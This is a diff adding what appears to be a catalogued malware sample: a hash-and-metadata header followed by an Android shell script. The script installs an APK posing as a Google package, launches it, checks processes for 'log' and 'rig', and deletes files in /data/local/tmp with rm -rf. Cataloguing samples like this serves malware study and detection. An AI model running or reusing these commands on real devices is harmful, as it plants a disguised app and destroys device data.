@@ -1,0 +1,17 @@
+# sha256: 99a7676f2b3629c3f4698249f61f3d506bb724723c9d54ad6d84ab6d26d87402
+# family: script_generic
+# kind: script
+# size_bytes: 225
+# first_seen: 2026-07-20 01:01:50.213883 UTC
+# times_seen: 1
+# yara_matches: none
+# ------------------------------------------------------------
+
+pm path com.google.home.tv
+pm install /data/local/tmp/tv.apk
+rm /data/local/tmp/tv.apk
+am start -n com.google.home.tv/com.example.test.MainActivity
+ps | grep log
+rm -rf /data/local/tmp/*
+ps | grep rig
+rm -rf /data/local/tmp/*
